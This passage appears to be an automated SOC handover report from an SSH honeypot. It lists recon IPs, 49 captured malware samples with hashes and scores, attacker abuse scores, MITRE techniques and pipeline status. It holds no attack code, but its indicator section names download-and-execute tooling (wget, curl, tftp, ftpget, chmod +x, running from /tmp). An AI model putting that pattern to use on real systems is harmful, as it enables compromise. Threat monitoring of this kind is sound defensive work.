| `34.76.194[.]102` | **30** | 2026-08-23 07:20 | 2026-08-23 07:21 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-23 06:57 | 2026-08-23 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]179` | **4** | 2026-08-23 07:56 | 2026-08-23 07:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.142.16[.]19` | **3** | 2026-08-23 07:46 | 2026-08-23 07:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.120.30[.]67` | **3** | 2026-08-23 07:51 | 2026-08-23 07:55 | 4m | 0 | `T1592` | 🟢 LOW |
| `191.103.49[.]15` | **2** | 2026-08-23 08:30 | 2026-08-23 08:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `73.255.217[.]234` | **2** | 2026-08-23 08:36 | 2026-08-23 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.29[.]158` | 1 | 2026-08-23 07:55 | 2026-08-23 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.86.227[.]79` | 1 | 2026-08-23 07:12 | 2026-08-23 07:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.33.226[.]3` | 1 | 2026-08-23 07:57 | 2026-08-23 07:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `190.60.37[.]146` | 1 | 2026-08-23 08:30 | 2026-08-23 08:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-23 08:38 | 2026-08-23 08:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `198.72.230[.]45` | 1 | 2026-08-23 08:48 | 2026-08-23 08:48 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-23 07:07 | 2026-08-23 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-08-23 07:39 | 2026-08-23 07:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]20` | 1 | 2026-08-23 08:50 | 2026-08-23 08:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.229.34[.]162` | 1 | 2026-08-23 07:08 | 2026-08-23 07:09 | 65s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]195` | 1 | 2026-08-23 07:56 | 2026-08-23 07:56 | 17s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-23 08:37 | 2026-08-23 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-23 07:45 | 2026-08-23 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.180.233[.]75` | 1 | 2026-08-23 06:57 | 2026-08-23 06:57 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.199.172[.]66` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `60.174.35[.]18` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `73.255.217[.]234` | US | Comcast IP Services, L.L.C. | **100** ⚠️ | 0 |
| `111.70.29[.]158` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `222.186.68[.]153` | CN | ZHENJIANG YIQUAN HOTEL | **100** ⚠️ | 50 |
| `83.191.176[.]93` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 45 |
| `190.60.37[.]146` | CO | UFINET COLOMBIA, S. A. | **100** ⚠️ | 2 |
| `24.45.235[.]179` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 1 |
| `49.124.149[.]20` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 33 |
| `115.86.227[.]79` | KR | HVYeongseo | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 70 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 63 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 141 cases |
| Tool 34  | Credential Extractor        | ✅ 87 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 66 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (10.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 63 priority case(s) shown individually · 21 recon entry/entries in table (7 group(s) consolidating 49 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T10:29:40Z_
